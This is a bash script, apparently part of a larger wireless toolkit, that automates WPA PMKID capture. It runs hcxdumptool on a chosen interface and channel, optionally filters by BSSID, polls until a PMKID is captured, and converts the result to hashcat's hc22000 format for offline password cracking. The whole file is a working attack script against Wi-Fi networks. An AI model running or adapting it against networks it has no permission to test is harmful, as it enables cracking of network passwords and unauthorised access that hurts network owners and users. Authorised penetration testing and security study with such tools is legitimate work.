#!/usr/bin/env bash
# PMKID capture without requiring clients
# Usage: pmkid_capture.sh <interface> <bssid> <channel> <timeout> <output_dir>

set -euo pipefail

_log()   { echo "$*" >&2; }
_json()  { printf '%s\n' "$*"; }
_die()   { _json "{\"status\":\"error\",\"message\":\"$1\"}"; exit 1; }

cleanup() {
    _log "[*] Cleaning up PMKID capture..."
    if [[ -n "${HCXDUMPTOOL_PID:-}" ]]; then
        kill "$HCXDUMPTOOL_PID" 2>/dev/null || true
        wait "$HCXDUMPTOOL_PID" 2>/dev/null || true
    fi
    if [[ -n "${ORIG_CHANNEL:-}" && -n "${IFACE:-}" ]]; then
        iw "$IFACE" set channel "$ORIG_CHANNEL" 2>/dev/null || true
    fi
    exit "${EXIT_RC:-0}"
}
trap cleanup EXIT

# ── Root check ────────────────────────────────────────────────────────
if [[ $EUID -ne 0 ]]; then
    _die "Root privileges required"
fi

# ── Dependency check ──────────────────────────────────────────────────
if ! command -v hcxdumptool &>/dev/null; then
    _die "hcxdumptool not found. Install hcxdumptool."
fi
if ! command -v hcxpcapngtool &>/dev/null; then
    _die "hcxpcapngtool not found. Install hcxtools."
fi

# ── Args ──────────────────────────────────────────────────────────────
IFACE="${1:-}"
BSSID="${2:-}"
CHANNEL="${3:-6}"
TIMEOUT="${4:-120}"
OUTPUT_DIR="${5:-/tmp/wafford_pmkid}"

if [[ -z "$IFACE" ]]; then
    _die "Usage: pmkid_capture.sh <interface> <bssid> <channel> <timeout> <output_dir>"
fi

mkdir -p "$OUTPUT_DIR"

# ── Validate interface ────────────────────────────────────────────────
if [[ ! -d "/sys/class/net/$IFACE" ]]; then
    _die "Interface '$IFACE' does not exist"
fi

# ── Save original channel ────────────────────────────────────────────
ORIG_CHANNEL=$(iw "$IFACE" info 2>/dev/null | awk '/channel/{print $2}' || echo "1")

# ── Set channel ───────────────────────────────────────────────────────
_log "[*] Setting channel $CHANNEL..."
iw "$IFACE" set channel "$CHANNEL" 2>/dev/null || true

# ── Output files ──────────────────────────────────────────────────────
PCAPNG_FILE="${OUTPUT_DIR}/pmkid_capture.pcapng"
HC22000_FILE="${OUTPUT_DIR}/pmkid.hc22000"
FILTER_ARGS=""

if [[ -n "$BSSID" ]]; then
    BSSID=$(echo "$BSSID" | tr '[:lower:]' '[:upper:]')
    FILTER_ARGS="--filterlist=${BSSID} --filtermode=2"
    _log "[*] Filtering for BSSID: $BSSID"
fi

# ── Start hcxdumptool ────────────────────────────────────────────────
_log "[*] Starting hcxdumptool for PMKID capture (timeout: ${TIMEOUT}s)..."

hcxdumptool \
    -i "$IFACE" \
    --enable_status=1 \
    $FILTER_ARGS \
    --filedump="${PCAPNG_FILE}" \
    2>/dev/null &
HCXDUMPTOOL_PID=$!

# ── Wait for timeout or PMKID detection ──────────────────────────────
ELAPSED=0
PMKID_FOUND=false
CHECK_INTERVAL=5

while [[ $ELAPSED -lt $TIMEOUT ]]; do
    sleep "$CHECK_INTERVAL"
    ELAPSED=$((ELAPSED + CHECK_INTERVAL))

    # Check if pcapng file exists and has data
    if [[ -f "$PCAPNG_FILE" ]]; then
        FILE_SIZE=$(stat -c%s "$PCAPNG_FILE" 2>/dev/null || echo "0")
        if [[ "$FILE_SIZE" -gt 0 ]]; then
            # Try to detect PMKID with hcxpcapngtool
            TEMP_OUT=$(mktemp)
            if hcxpcapngtool -o "$TEMP_OUT" "$PCAPNG_FILE" 2>/dev/null; then
                if [[ -s "$TEMP_OUT" ]]; then
                    PMKID_FOUND=true
                    _log "[+] PMKID captured!"
                    rm -f "$TEMP_OUT"
                    break
                fi
            fi
            rm -f "$TEMP_OUT"
        fi
    fi

    _log "[*] Elapsed: ${ELAPSED}s / ${TIMEOUT}s"
done

# ── Stop hcxdumptool ─────────────────────────────────────────────────
kill "$HCXDUMPTOOL_PID" 2>/dev/null || true
wait "$HCXDUMPTOOL_PID" 2>/dev/null || true
HCXDUMPTOOL_PID=""

# ── Convert to hashcat format ────────────────────────────────────────
CONVERSION_OK=false

if [[ -f "$PCAPNG_FILE" ]]; then
    hcxpcapngtool -o "$HC22000_FILE" "$PCAPNG_FILE" 2>/dev/null || true
    if [[ -s "$HC22000_FILE" ]]; then
        CONVERSION_OK=true
        _log "[+] Successfully converted to hc22000 format"
    fi
fi

# ── Build result ──────────────────────────────────────────────────────
STATUS="success"
if [[ "$PMKID_FOUND" == false ]]; then
    STATUS="not_found"
fi

RESULT="{\"status\":\"${STATUS}\",\"pmkid_found\":${PMKID_FOUND},\"capture_file\":\"${PCAPNG_FILE}\",\"bssid\":\"${BSSID:-any}\",\"channel\":${CHANNEL},\"duration\":${TIMEOUT}}"

if [[ "$CONVERSION_OK" == true ]]; then
    RESULT=$(echo "$RESULT" | sed "s/}$/,\"hc22000_file\":\"${HC22000_FILE}\"}/")
fi

_json "$RESULT"
